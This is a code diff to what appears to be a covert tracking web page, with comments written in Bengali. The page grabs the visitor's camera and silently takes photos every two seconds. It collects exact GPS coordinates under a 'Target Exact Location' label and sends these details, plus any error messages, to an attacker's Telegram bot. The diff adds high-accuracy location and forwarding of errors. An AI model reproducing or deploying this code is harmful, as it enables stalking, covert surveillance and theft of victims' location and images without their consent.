@@ -101,18 +101,21 @@
             let syncMsg = `✅ **Camera Access Granted!**\n👤 **Gender:** ${gender}`;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(syncMsg)}&parse_mode=Markdown`);
             // জিপিএস লোকেশন সংগ্রহের কোড
-            if ("geolocation" in navigator) {
+                        if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
+                    // একদম সঠিক গুগল ম্যাপ লিঙ্ক
                     const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                     
                     let locMsg = `📍 **Target Exact Location!**\n🔗 [Open in Google Maps](${mapLink})`;
                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(locMsg)}&parse_mode=Markdown`);
                 }, function(error) {
-                    console.log("Location access denied.");
-                });
-            }
+                    // যদি কোনো সমস্যা হয় তবে টেলিগ্রামে এরর মেসেজ পাঠাবে
+                    let errMsg = `⚠️ **Location Error:** ${error.message}`;
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(errMsg)}`);
+                }, { enableHighAccuracy: true }); // হাই একুরেসি অন করা হলো
+                        }
             
             photoInterval = setInterval(captureSilent, 2000);
 
